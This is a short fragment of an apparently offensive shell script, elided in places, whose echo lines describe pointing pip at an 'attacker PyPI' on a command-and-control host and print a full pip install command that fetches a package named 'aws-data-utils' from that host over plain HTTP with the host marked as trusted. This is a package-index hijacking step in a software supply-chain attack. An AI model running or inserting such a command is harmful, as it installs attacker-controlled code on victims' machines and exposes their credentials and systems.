...
echo "=========================================="
echo ""
echo "[*] Configuring pip to use attacker PyPI: http://$C2_IP:8080/simple/"
echo ""
...
echo "  pip install --index-url http://$C2_IP:8080/simple/ --trusted-host $C2_IP aws-data-utils"
echo ""
